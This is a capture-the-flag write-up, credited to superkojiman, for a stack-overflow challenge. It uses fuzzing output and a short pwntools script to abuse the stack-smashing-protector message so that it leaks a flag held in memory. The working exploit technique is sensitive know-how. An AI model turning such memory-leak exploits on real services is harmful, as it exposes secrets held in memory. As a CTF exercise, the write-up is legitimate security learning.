### Solved by superkojiman

Connect to the server and we get:

```
$ nc challs.ctf.site 20001
Interesting data loaded at 0x7fffffffe540
Your username?
```

This address never changes. If we run it in gdb we see that the contents of flag.txt is copied into that address. There's one call to read() that reads in 1024 bytes, and a stack canary is present. 

We can use a SSP leak to get the flag. First use pattern_create to determine at which point RIP is overwritten. In this case, it's at offset 152. So we can start fuzzing at offset 152. On my local machine the address is 0x7fffffffe0b0:

```
# for i in `seq 152 1024`; do echo "i: $i"; python -c "from pwn import *;print 'A' * ${i} + p64(0x7fffffffe0b0)" | ./xpl; done
.
.
.
i: 374
Interesting data loaded at 0x7fffffffe0b0
Your username? Segmentation fault (core dumped)
i: 375
Interesting data loaded at 0x7fffffffe0b0
Your username? Segmentation fault (core dumped)
i: 376
Interesting data loaded at 0x7fffffffe0b0
Your username? *** stack smashing detected ***: flag{w00t-w00t-ninja}
 terminated
Aborted (core dumped)
i: 377
Interesting data loaded at 0x7fffffffe0b0
Your username? Segmentation fault (core dumped)
.
.
.
```

At offset 376 we get our own flag. So let's try it on the server. Exploit:

```python
#!/usr/bin/env python

from pwn import *

buf = ""
buf += "A"*376
buf += p64(0x7fffffffe540)

f = open("in.txt", "w")
f.write(buf)
f.close()

We can pipe this file into nc to get the flag:

# cat in.txt | nc challs.ctf.site 20001
Interesting data loaded at 0x7fffffffe540
Your username? *** stack smashing detected ***: EKO{pwning_stack_protector}
 terminated
```

Flag is ***EKO{pwning_stack_protector}***
